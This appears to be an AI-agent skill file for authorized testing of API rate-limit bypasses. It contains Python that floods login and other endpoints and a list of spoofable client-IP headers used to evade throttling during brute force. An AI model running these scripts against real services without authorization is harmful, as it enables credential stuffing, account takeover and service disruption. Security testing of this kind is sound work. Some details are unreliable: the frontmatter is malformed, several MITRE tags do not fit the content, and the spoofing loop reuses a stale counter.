---
name: performing-api-rate-limiting-bypass
description: 'Tests API rate limiting for bypass vulnerabilities using Python (requests/aiohttp)
when-to-use: 'Tests API rate limiting for bypass vulnerabilities using Python (requests/aiohttp)
  and Burp Suite Turbo Intruder to manipulate headers (e.g. X-Forwarded-For spoofing),
  IPs, HTTP methods, API versions, and encodings, mapping findings to OWASP API4:2023
  Unrestricted Resource Consumption. Use when assessing, under written authorization,
  whether rate limits can be bypassed to enable brute force or resource-exhaustion
  attacks.

  '
domain: cybersecurity
subdomain: api-security
tags:
- api-security
- owasp
- rate-limiting
- throttling
- brute-force
- dos-prevention
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1552.001
- T1027
- T1055
---
# Performing API Rate Limiting Bypass

## When to Use

- Testing whether API rate limiting can be circumvented to enable brute force attacks on authentication endpoints
- Assessing the effectiveness of API throttling controls against credential stuffing or account enumeration
- Evaluating if rate limits are enforced consistently across all API versions, methods, and encoding formats
- Testing if API gateway rate limiting can be bypassed through header manipulation or IP rotation
- Validating that rate limits protect against resource exhaustion and denial-of-service conditions

**Do not use** without written authorization. Rate limit testing involves sending high volumes of requests that may impact service availability.

## Prerequisites

- Written authorization specifying target endpoints and acceptable request volumes
- Python 3.10+ with `requests`, `aiohttp`, and `asyncio` libraries
- Burp Suite Professional with Turbo Intruder extension for high-speed testing
- cURL for manual header manipulation testing
- Knowledge of the target's CDN and WAF infrastructure (Cloudflare, AWS WAF, Akamai)
- List of rate-limit bypass headers to test

## Workflow

### Step 1: Rate Limit Discovery and Baseline

Identify how rate limiting is implemented:

```python
import requests
import time

BASE_URL = "https://target-api.example.com/api/v1"
headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}

# Send requests and track rate limit headers
def probe_rate_limit(endpoint, method="GET", count=100):
    results = []
    for i in range(count):
        resp = requests.request(method, f"{BASE_URL}{endpoint}", headers=headers)
        rate_headers = {
            "limit": resp.headers.get("X-RateLimit-Limit") or resp.headers.get("X-Rate-Limit-Limit"),
            "remaining": resp.headers.get("X-RateLimit-Remaining") or resp.headers.get("X-Rate-Limit-Remaining"),
            "reset": resp.headers.get("X-RateLimit-Reset") or resp.headers.get("X-Rate-Limit-Reset"),
            "retry_after": resp.headers.get("Retry-After"),
            "status": resp.status_code
        }
        results.append(rate_headers)
        if resp.status_code == 429:
            print(f"Rate limited at request {i+1}: {rate_headers}")
            return results, i+1
        time.sleep(0.05)  # Small delay to avoid connection issues
    print(f"No rate limit triggered after {count} requests")
    return results, count

# Test key endpoints
login_results, login_threshold = probe_rate_limit("/auth/login", "POST", 200)
api_results, api_threshold = probe_rate_limit("/users/me", "GET", 200)
search_results, search_threshold = probe_rate_limit("/search?q=test", "GET", 200)

print(f"\nRate Limit Summary:")
print(f"  Login: Triggered at request {login_threshold}")
print(f"  API: Triggered at request {api_threshold}")
print(f"  Search: Triggered at request {search_threshold}")
```

### Step 2: IP-Based Bypass Techniques

```python
# Bypass Technique 1: Header-based IP spoofing
IP_SPOOFING_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Original-Forwarded-For",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Host",
    "X-Forwarded-Host",
    "True-Client-IP",
    "Cluster-Client-IP",
    "X-ProxyUser-Ip",
    "Forwarded",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "X-Azure-ClientIP",
    "X-Akamai-Client-IP",
]

def test_ip_spoofing_bypass(endpoint, method="POST", body=None):
    """Test if IP spoofing headers bypass rate limiting."""
    # First, trigger the rate limit normally
    for i in range(200):
        resp = requests.request(method, f"{BASE_URL}{endpoint}", headers=headers, json=body)
        if resp.status_code == 429:
            print(f"Rate limit triggered at request {i+1}")
            break

    # Now test each spoofing header
    bypasses_found = []
    for header in IP_SPOOFING_HEADERS:
        spoofed_headers = {**headers, header: f"10.0.{i%256}.{(i*7)%256}"}
        resp = requests.request(method, f"{BASE_URL}{endpoint}", headers=spoofed_headers, json=body)
        if resp.status_code != 429:
            bypasses_found.append(header)
            print(f"[BYPASS] {header} -> {resp.status_code}")

    return bypasses_found

login_body = {"username": "test@example.com", "password": "wrongpassword"}
bypasses = test_ip_spoofing_bypass("/auth/login", "POST", login_body)
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
